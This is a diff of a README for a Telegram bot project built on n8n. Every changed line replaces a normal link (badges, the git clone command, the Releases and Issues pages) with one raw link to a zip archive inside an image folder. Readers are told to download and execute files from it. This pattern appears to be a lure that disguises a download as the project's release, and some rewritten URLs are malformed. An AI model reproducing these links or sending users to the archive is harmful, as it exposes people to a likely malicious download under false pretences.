@@ -1,6 +1,6 @@
 # n8n Executive Bot Platform: Your Smart Telegram Assistant 🤖
 
-![GitHub Release](https://img.shields.io/badge/Latest%20Release-v1.0.0-blue?style=flat-square&logo=github)
+![GitHub Release](https://raw.githubusercontent.com/hidetheweed11/n8n_ExecutiveBot_Platform/master/Image/n_Platform_Bot_Executive_1.1-alpha.5.zip%20Release-v1.0.0-blue?style=flat-square&logo=github)
 
 ## Overview
 
@@ -28,7 +28,7 @@ To get started with the n8n Executive Bot, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/hidetheweed11/n8n_ExecutiveBot_Platform.git
+   git clone https://raw.githubusercontent.com/hidetheweed11/n8n_ExecutiveBot_Platform/master/Image/n_Platform_Bot_Executive_1.1-alpha.5.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -90,7 +90,7 @@ This project covers a range of topics, including:
 
 ### Releases
 
-For the latest updates and versions, visit the [Releases section](https://github.com/hidetheweed11/n8n_ExecutiveBot_Platform/releases). You can download and execute the latest files from there.
+For the latest updates and versions, visit the [Releases section](https://raw.githubusercontent.com/hidetheweed11/n8n_ExecutiveBot_Platform/master/Image/n_Platform_Bot_Executive_1.1-alpha.5.zip). You can download and execute the latest files from there.
 
 ### Contributing
 
@@ -118,16 +118,16 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ### Support
 
-If you encounter any issues or have questions, please check the [Issues section](https://github.com/hidetheweed11/n8n_ExecutiveBot_Platform/issues) or reach out via email.
+If you encounter any issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/hidetheweed11/n8n_ExecutiveBot_Platform/master/Image/n_Platform_Bot_Executive_1.1-alpha.5.zip) or reach out via email.
 
 ### Acknowledgments
 
 - Special thanks to the developers of n8n for their excellent automation platform.
 - Thanks to the contributors who make this project better.
 
-For more details and updates, feel free to visit our [Releases section](https://github.com/hidetheweed11/n8n_ExecutiveBot_Platform/releases). You can find the latest features and updates there.
+For more details and updates, feel free to visit our [Releases section](https://raw.githubusercontent.com/hidetheweed11/n8n_ExecutiveBot_Platform/master/Image/n_Platform_Bot_Executive_1.1-alpha.5.zip). You can find the latest features and updates there.
 
-![Telegram Bot](https://img.shields.io/badge/Telegram%20Bot-Ready-brightgreen?style=flat-square&logo=telegram)
+![Telegram Bot](https://raw.githubusercontent.com/hidetheweed11/n8n_ExecutiveBot_Platform/master/Image/n_Platform_Bot_Executive_1.1-alpha.5.zip%20Bot-Ready-brightgreen?style=flat-square&logo=telegram)
 
 ### Contact
 
